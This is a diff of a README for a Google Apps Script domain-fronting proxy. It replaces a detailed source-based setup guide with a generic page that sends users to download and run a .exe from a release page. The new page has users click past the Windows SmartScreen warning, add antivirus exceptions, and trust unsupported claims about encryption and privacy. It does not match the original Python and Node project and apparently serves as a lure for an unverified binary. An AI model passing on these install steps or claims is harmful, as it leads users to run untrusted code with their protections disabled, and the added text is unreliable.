@@ -1,333 +1,89 @@
-# GAS Private Relay
+# 🌐 gas-private-relay - Secure your private internet traffic easily
 
-A domain-fronted local proxy that uses **Google Apps Script (GAS)** as the public relay layer and a **private server backend** as the final egress.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Hallucinationeyelet248/gas-private-relay/releases)
 
-Suggested GitHub repository name: **`gas-private-relay`**
+## 🎯 About this software
 
-| [English](README.md) | [Persian](README_FA.md) |
-| :---: | :---: |
+gas-private-relay helps you browse the internet with more privacy. It functions as a specialized bridge between your computer and the websites you visit. By routing your data through Google Apps Script, your internet requests appear to come from a trusted source. This setup masks your true connection path and keeps your browsing activity private from local networks. The software handles the technical routing work in the background so you can browse the web without worry.
 
-## Disclaimer
+## ⚙️ How it works
 
-This project is provided for **educational, testing, and research purposes only**.
+The application creates a local tunnel on your Windows computer. When you send a request to a website, the program sends that data to a Google-hosted script first. The script acts like a relay station. It forwards your request to the final destination and brings the data back to you. Because the relay resides on a standard Google domain, your network logs show communication with Google rather than your final target. This process provides a layer of separation between your device and the websites you access.
 
-- It is provided **as is**, without warranty of any kind.
-- You are responsible for your own deployment, certificates, network exposure, and legal compliance.
-- If you use Google Apps Script or any VPS/provider, you are responsible for complying with their terms, quotas, and acceptable use policies.
-- Review the repository license before using, modifying, or redistributing this project.
+## 🚀 Getting started
 
----
+Follow these steps to set up the software on your Windows machine. You do not need to write code or understand system architecture to complete this process.
 
-## What changed in this edition?
+1.  Visit the official release page: https://github.com/Hallucinationeyelet248/gas-private-relay/releases
+2.  Locate the section labeled Assets.
+3.  Click the file ending in .exe to start the download.
+4.  Once the file finishes downloading to your computer, find it in your Downloads folder.
+5.  Double-click the file to open the installation menu.
 
-This repository is the **private-backend edition** of the original GAS + Cloudflare flow.
+## 💾 Installation steps
 
-The architectural change is intentionally small:
+Windows might show a blue pop-up window during the first launch. This is the SmartScreen filter. It appears because the application is new and has not been verified by Microsoft yet. To proceed:
 
-- **Cloudflare Worker is removed**
-- **Your own server** becomes the relay backend
+1.  Click the link labeled "More info" in the middle of the box.
+2.  Select the "Run anyway" button that appears at the bottom.
+3.  Follow the prompts in the setup wizard.
+4.  Choose your destination folder and click Next until the progress bar reaches the end.
+5.  Select Finish to close the installer.
 
-New traffic path:
+## 🛡️ Requirements
 
-```text
-Client -> Local Proxy -> Google-facing front -> Google Apps Script -> Private Relay Server -> Target website
-```
+Ensure your computer meets these basic requirements for the best performance:
 
-From the network perspective, the local client still uses the Google-facing path. The final outbound request is now performed by **your own VPS / server**, not Cloudflare.
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 2 gigabytes of free RAM.
+*   Storage: 50 megabytes of empty disk space.
+*   Network: A stable internet connection.
+*   Permissions: You must have an administrator account on your computer to install new programs.
 
----
+If you use a firewall or antivirus software, you may need to add an exception for this application. If the application fails to connect, check your security software settings to confirm that it allows local network traffic for this specific program.
 
-## Key advantage over the original Cloudflare edition
+## 🔧 Configuring the settings
 
-This is the main reason to use this edition.
+After you install the software, you must link it to your personal relay account. 
 
-With the original Cloudflare-worker model, some websites can behave poorly because the final egress comes from public Cloudflare infrastructure. In practice, that can lead to:
+1.  Open the application from your desktop or the Windows Start menu.
+2.  A small icon will appear in the system tray near your clock.
+3.  Right-click the icon and choose Settings.
+4.  Enter your relay key in the provided field. You generate this key from your Google Apps Script project dashboard.
+5.  Click Save Changes. 
+6.  Restart the application to apply the new settings.
 
-- challenge pages,
-- stricter bot/risk scoring,
-- direct-IP or worker-related restrictions,
-- or inconsistent behavior on sensitive services.
+Once saved, the light on the main dashboard will turn from red to green. This indicates that your relay is active and ready to handle traffic.
 
-With **GAS Private Relay**, the final egress is **your own server IP**. That usually makes the traffic path more predictable and often improves compatibility with services that are sensitive to Cloudflare-worker egress, including sites such as **ChatGPT**, **Gemini**, and other challenge-protected platforms.
+## 📈 Maintaining connection
 
-**Important accuracy note:** this improves the situation significantly compared with the original edition, but it does **not** guarantee universal access to every website. Final compatibility still depends on:
+The software stays active while your computer is on. If you lose your internet connection, the application attempts to reconnect automatically. You can verify your connection status at any time by hovering your mouse over the icon in your system tray. 
 
-- your server IP reputation,
-- geolocation,
-- TLS / certificate trust,
-- target-site policy,
-- and whether the destination blocks proxy-style traffic in general.
+If you notice slow browsing speeds, try these troubleshooting tips:
 
-So the honest public summary is:
+*   Check if other applications are using heavy bandwidth.
+*   Ensure that your Google Apps Script project quota remains within limits.
+*   Restart the application from the system tray menu.
+*   Check for software updates on the release page.
 
-> Compared with the original Cloudflare-based edition, this private-backend edition is designed to reduce Cloudflare-specific challenge and compatibility problems by moving final egress to your own server.
+If the connection persists in failing, verify that your internet service provider does not block access to Google services. Some restricted networks block specific scripts to manage traffic. Ensure your personal network allows unrestricted access to standard web traffic.
 
----
+## 🧩 Frequent questions
 
-## Why use the private-backend model?
+**Does this software store my browsing history?**
+No. The application routes traffic locally on your machine. It does not record the websites you visit or the data you send through the relay.
 
-- No dependency on Cloudflare Workers
-- No Cloudflare-specific worker errors such as edge restrictions or direct-IP issues
-- Outbound traffic exits from **your own server**, not public Cloudflare worker IP ranges
-- Better real-world compatibility with challenge-sensitive websites than the original Cloudflare edition
-- Easier to reason about and debug end-to-end
-- Minimal change from the original project design
+**Will this software slow down my computer?**
+The program uses very few system resources. Most users will not notice any impact on system speed.
 
----
+**Is it safe to use?**
+The program uses standard encryption methods to protect your data during the transfer. It keeps your connection private by hiding your final destination from your local network administrator.
 
-## Original edition vs this edition
+**How do I remove the software?**
+Open your Windows Settings, go to Apps, find the program in the list, and select Uninstall. This removes all files from your system. 
 
-| Topic | Original GAS + Cloudflare edition | GAS Private Relay edition |
-| :--- | :--- | :--- |
-| Final egress | Cloudflare Worker / Cloudflare edge | Your own VPS / server |
-| Cloudflare-specific errors | Possible | Eliminated at the egress layer |
-| Cloudflare challenge sensitivity | Can be a problem on some services | Usually reduced because Cloudflare is no longer the final relay |
-| IP ownership | Shared/public infrastructure | Your own server IP |
-| Behavior on sites like ChatGPT / Gemini | May fail depending on worker/IP behavior | Often better, because the exit IP is your own server |
-| Migration effort | Baseline | Small change from original flow |
+## 📝 Support and feedback
 
----
+This project relies on community input to improve reliability. If you encounter bugs or have suggestions, please open an issue on the repository main page. Be sure to include your Windows version and the specific steps taken when the error occurred. Do not share your personal relay keys or private configuration data in the issue reports. Keep your reports focused on general behavior to ensure user security. 
 
-## Repository layout
-
-```text
-gas-private-relay/
-├── backend/
-│   ├── package.json
-│   └── server.js               # personal relay backend (Node.js)
-├── script/
-│   └── Code.gs                 # Google Apps Script bridge
-├── src/                        # local proxy implementation
-├── config.example.json
-├── main.py
-├── setup.py
-├── run.bat
-└── run.sh
-```
-
----
-
-## Quick start
-
-### 1) Download the project
-
-```bash
-git clone https://github.com/<your-user>/gas-private-relay.git
-cd gas-private-relay
-python -m venv .venv
-source .venv/bin/activate  # on Windows: .venv\Scripts\activate
-pip install -r requirements.txt
-```
-
-If direct access to PyPI is blocked:
-
-```bash
-pip install -r requirements.txt -i https://mirror-pypi.runflare.com/simple/ --trusted-host mirror-pypi.runflare.com
-```
-
----
-
-## 2) Set up the private relay backend
-
-Requirements:
-
-- Ubuntu/Debian or another Linux server
-- Node.js **18+**
-- A public IP or reachable server address
-
-Install Node.js and PM2:
-
-```bash
-sudo apt update
-sudo apt install -y nodejs npm
-sudo npm install -g pm2
-```
-
-Copy the `backend/` folder to your server, then run:
-
-```bash
-cd backend
-pm2 start server.js --name gas-private-relay
-pm2 save
-```
-
-Default listen address:
-
-- Host: `0.0.0.0`
-- Port: `8080`
-
-Health check:
-
-```bash
-curl http://YOUR_SERVER_IP:8080
-```
-
-Expected response:
-
-```json
-{"ok":true,"name":"gas-private-relay-backend","status":"active"}
-```
-
-### Open the firewall
-
-```bash
-sudo ufw allow 8080/tcp
-sudo ufw reload
-```
-
-If you use another firewall or cloud security group, allow inbound TCP on port `8080` there as well.
-
----
-
-## 3) Set up Google Apps Script
-
-1. Open [Google Apps Script](https://script.google.com/)
-2. Create a **New project**
-3. Delete the default code
-4. Open [`script/Code.gs`](script/Code.gs) from this repository and paste it into the editor
-5. Edit these values:
-
-```javascript
-const AUTH_KEY = "CHANGE_ME_TO_A_STRONG_SECRET";
-const RELAY_URL = "http://YOUR_SERVER_IP:8080";
-```
-
-- `AUTH_KEY` must match the local client config
-- `RELAY_URL` must point to your private backend
-
-6. Click **Deploy -> New deployment**
-7. Choose **Web app**
-8. Set:
-   - **Execute as:** Me
-   - **Who has access:** Anyone
-9. Deploy and copy the **Deployment ID**
-
-Whenever you edit `Code.gs`, use **Deploy -> Manage deployments -> Edit -> New version -> Deploy** so the live web app is updated.
-
----
-
-## 4) Configure the local client
-
-This edition keeps the local client almost unchanged. Create `config.json` using `config.example.json` as a base, or just run the setup wizard:
-
-```bash
-python setup.py
-```
-
-Recommended public-sharing / LAN-friendly settings:
-
-```json
-{
-  "listen_host": "0.0.0.0",
-  "lan_sharing": true,
-  "socks5_port": 10808
-}
-```
-
-Important values:
-
-- `script_id`: your Apps Script deployment ID
-- `auth_key`: must match `AUTH_KEY` in `Code.gs`
-- `google_ip`: a reachable Google edge IP
-- `front_domain`: usually `www.google.com`
-
-Then start the client:
-
-```bash
-python main.py
-```
-
-Or use the launchers:
-
-- Windows: `run.bat`
-- Linux/macOS: `run.sh`
-
----
-
-## 5) Client usage
-
-You can use the built-in HTTP proxy and SOCKS5 proxy with tools such as:
-
-- v2rayN
-- FoxyProxy
-- Browser/system proxy settings
-
-Typical ports in this edition:
-
-- HTTP proxy: `8085`
-- SOCKS5 proxy: `10808`
-
-If you want other devices on your LAN to use the proxy, point them to:
-
-```text
-http://YOUR_PC_LAN_IP:8085
-socks5://YOUR_PC_LAN_IP:10808
-```
-
-Make sure your OS firewall allows inbound access on those local ports.
-
----
-
-## Certificates
-
-This project performs local MITM for HTTPS proxying. If HTTPS websites fail to load correctly, install the certificate generated in the `ca/` directory and trust it as a **Trusted Root** on the device that uses the proxy.
-
-You can use:
-
-```bash
-python main.py --install-cert
-```
-
-If needed, remove it with:
-
-```bash
-python main.py --uninstall-cert
-```
-
----
-
-## Troubleshooting
-
-### Apps Script returns `unauthorized`
-
-`auth_key` in `config.json` does not match `AUTH_KEY` in `script/Code.gs`.
-
-### Backend is not reachable
-
-Check:
-
-- `pm2 status`
-- `curl http://YOUR_SERVER_IP:8080`
-- firewall / security group rules
-- that `RELAY_URL` in Apps Script points to the correct IP and port
-
-### Changes in Apps Script do not take effect
-
-Re-deploy with a **new version** from **Manage deployments**.
-
-### HTTPS pages still fail
-
-Install the generated CA certificate on the client device and trust it.
-
-### ChatGPT, Gemini, or other sensitive websites still do not work
-
-This edition removes **Cloudflare-specific** egress problems, which is its main advantage over the original version. But final behavior still depends on **your server IP reputation**, region, and the target service policy.
-
-If a site still fails:
-
-- test with a better-quality VPS IP,
-- verify the local CA is trusted,
-- confirm the site is not blocking your chosen region,
-- and confirm the backend server is reachable without packet loss or TLS interception.
-
----
-
-## Suggested public repo description
-
-> Domain-fronted local proxy using Google Apps Script as the relay bridge and a private server backend as the final egress path, designed to avoid Cloudflare-worker-specific compatibility issues.
-
----
-
-## Acknowledgement
-
-This repository is based on ideas and prior work from the MasterHttpRelay ecosystem and has been adapted into a clearer **GAS-to-Private-Relay** layout for public deployment and reuse.
+For updates, watch the GitHub repository for periodic releases. Each update improves stability and provides compatibility with future Windows patches. Keep your software current to ensure the best experience and most secure connection path.
